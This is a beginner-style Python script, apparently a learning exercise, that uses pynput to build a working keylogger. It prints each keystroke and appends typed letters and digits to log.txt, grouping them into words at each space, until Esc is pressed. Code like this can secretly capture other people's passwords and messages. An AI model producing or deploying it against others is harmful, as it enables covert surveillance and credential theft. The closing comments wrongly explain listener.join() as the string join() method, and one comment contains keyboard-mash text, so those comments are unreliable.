
import pynput 

from pynput.keyboard import Key, Listener
#Idea, this program lists keys pressed vertically. I want it in words. 
    #combine every key pressed into words, separated by the space key as filter

#Count, every so many keys, it updates the file so data isnt lost when program close somehow
    #this way you're not constanly rewriting the file every second but after user hits certain number of kes
count=0
keys=[]


def on_press(key):
    global keys, count
    #Whenever hits a key, append that key
    keys.append(key)

    count+=1

    #Places the key into the place where the {0} is. 
    print("{0} pressed".format(key))

    #updating keys every 10 keys
    if count>=10:
        #reset count
        count=0
        write_file(keys)
        #reset keys list
        keys=[]


def on_release(key):
    #If "Esc" is pressed, ends the program returning "Key.esc pressed"
    if key==Key.esc:
        return False 

def write_file(keys):
    #as f - open log.txt in append mode
    with open("log.txt","a") as f:
    #Note, if first time you're running this and don't have a txt file created,
        #you can use "w" to wite and if file does't exist, creates one. But the second time, can't use "w"
            #use "a", for append
        for key in keys:
            #Replaces the quotation mark from key, i.e. '3'
            k=str(key).replace("'","")

            if k.find("space")>0:
                #adding a new line if space key is found (note space key is Key.space, so looking for space keyword)
                f.write('\n')
            elif k.find("Key")==-1:
                #if any other key besides space is found, i.e. backspace etc, we dont want those logged
                #in find() if "Key" doesn't exist we write it into file, meaning we hit a letter or number key (because they dont appear as Key.'q'), then it returns -1
                f.write(k) 
            #f.write(str(key))

#Listener listens for key eventssdfsdhdfhkwherh
#on_press and on_release are functions that will be called onpress of a key and on release
#constantly keeps running loop intil you break
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    #The join() is a string method which returns a string concatenated with the elements of an iterable.
    #Iterable--such as list, string and tuple
    #So the join() method takes an iterable, and concatenates each element to the string and returns concatonated string
        #string.join(iterable)

    #with keyword is used when working with unmanaged resources (like file streams)
        #when you have two related operations  you’d like to execute as a pair, with a block of code in between
        #'with' statement clarifies code that previously would use try...finally blocks to ensure that clean-up code is executed.

        